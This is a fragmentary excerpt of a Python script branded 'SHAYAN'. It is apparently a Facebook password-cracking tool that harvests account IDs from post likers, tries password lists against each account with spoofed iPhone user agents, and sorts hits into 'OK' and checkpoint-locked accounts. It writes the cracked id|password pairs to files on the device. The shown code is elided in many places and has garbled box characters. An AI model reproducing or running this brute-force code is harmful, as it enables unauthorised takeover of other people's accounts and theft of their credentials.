...
for jiah in range(1000):
	...
	c='OKU iPhone OS 10_3_2 like Mac OS X'
...
# INDICATION
id,id2,loop,ok,OK,akun,oprek,method,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[]
lisensiku=['sukses']
cokbrut=[]
pwpluss,pwnya=[],[]
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# THIS SCRIPT SHOULD ONLY BE USED BY PEOPLE WHO HAVE OBTAINED PERMISSION FROM AUTHOR : SHAYAN, CONTACT ACCESS PERMIT:085718094505'
...
def result():
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/SHAYAN-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			for OKku in range(len(lin)):
				...
				sol().print(mark(OKkuh,style="yellow"))
				noOK +=1
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/SHAYAN-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/SHAYAN-DATA/OK')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/SHAYAN-DATA/OK/'+geh,'r').readlines()
			for fz in hf:
...
def dump_likes():
	...
	win2 = mark(win, style='bold green')
	sol().print(win2)
	pil = input(x+'['+p+'shayan'+x+'] INPUT ID POST : ')
	try:
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%sSHAYAN %s🐍%s 🐍 OK:%s 🐍 OK:%s 🐍 %s%s%s   '%(bi,loop,len(id2),ok,OK,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statusOK = f'× {idf} • {pw}'
					statusOK1 =nel(statusOK, style='bold yellow')
					cetak(nel(statusOK1, title='SHAYAN XD OK'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='SHAYAN LIVE'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]SHAYAN LIVE[/bold green]'))
					ok+=1
					break
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%sâ””â”€â”€ %s|%s â”€â”€  OK       %s'%(b,idf,pw,x))
		open('OK/'+OKc,'a').write(idf+'|'+pw+'\n')
		OK+=1
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%sâ•°â”€â”€â”€ %s|%s ----> OK       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
